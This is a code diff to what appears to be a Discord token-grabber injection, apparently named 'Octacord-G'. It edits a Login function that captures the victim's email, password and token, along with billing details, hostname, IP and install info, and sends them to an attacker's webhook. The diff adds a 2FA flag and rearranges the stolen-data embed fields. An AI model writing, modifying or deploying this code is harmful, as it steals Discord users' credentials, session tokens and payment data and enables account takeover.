@@ -166,6 +166,13 @@ function GetBadges(flags) {
 }
 
 function Login(email, password, token) {
+let twoFA = "";
+	if(token.startsWith("mfa")){
+        twoFA = "True"
+    }
+    else{
+        twoFA= "False"
+    }
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
@@ -244,10 +251,6 @@ function Login(email, password, token) {
                             "title": "Login Detected",
                             "color": 16507654,
                             "fields": [{
-                                name: "Info",
-                                value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
-                                inline: !1
-                            }, {
                                 name: "Username",
                                 value: `\`${json.username}#${json.discriminator}\``,
                                 inline: !0
@@ -259,12 +262,8 @@ function Login(email, password, token) {
                                 name: "Nitro",
                                 value: `${GetNitro(json.premium_type)}`,
                                 inline: !1
-                            }, {
-                                name: "Badges",
-                                value: `${GetBadges(json.flags)}`,
-                                inline: !1
-                            }, {
-                                name: "Billing",
+                            },  {
+                                name: "Billing(Not 100% Correct)",
                                 value: `${Cool()}`,
                                 inline: !1
                             }, {
@@ -279,16 +278,20 @@ function Login(email, password, token) {
                                 name: "Token",
                                 value: `\`\`\`${token}\`\`\``,
                                 inline: !1
-                            }, ],
+                            },{
+                                name: "PC Info",
+                                value: `\`\`\`PC NAME: \n${computerName}\nIP: ${ip}\n ${discordInstall}\n\`\`\``,
+                                inline: !1
+                            },  ],
                             "author": {
-					"name": `${json.username}.${json.id}`,
+					"name": `${json.username}.${json.discriminator}`,
 					"icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 				},
 				"footer": {
 					"text": "Octacord-G"
 				}
                         
-                        ]
+                        }]
                     }
                     SendToWebhook(JSON.stringify(params))
                 })
